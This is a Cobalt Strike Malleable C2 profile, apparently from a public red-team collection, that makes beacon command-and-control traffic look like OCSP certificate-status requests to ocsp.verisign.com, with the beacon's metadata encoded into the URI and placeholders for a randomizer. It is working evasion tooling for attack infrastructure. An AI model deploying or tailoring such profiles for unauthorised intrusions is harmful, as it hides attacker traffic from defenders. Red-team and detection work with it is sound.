# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# Online Certificate Status Protocol (OCSP) Profile
#   http://tools.ietf.org/html/rfc6960
#
# Author: @harmj0y
#

set sleeptime "%%number:2%%00";
set jitter    "1%%number%%";
set maxdns    "24%%number%%";
set useragent "Microsoft-CryptoAPI/6.1";


http-get {

    set uri "/oscp/";

    client {
        header "Accept" "*/*";
        header "Host" "ocsp.verisign.com";

        metadata {
            netbios;
            uri-append;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Cache-Control" "max-age=547738, public, no-transform, must-revalidate";
        header "Connection" "keep-alive";

        output {
            print;
        }
    }
}

http-post {

    set uri "/oscp/a/";

    client {

        header "Accept" "*/*";
        header "Host" "ocsp.verisign.com";
        
        id {
            netbios;
            uri-append;
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Cache-Control" "max-age=547738, public, no-transform, must-revalidate";
        header "Connection" "keep-alive";

        output {
            print;
        }
    }
}

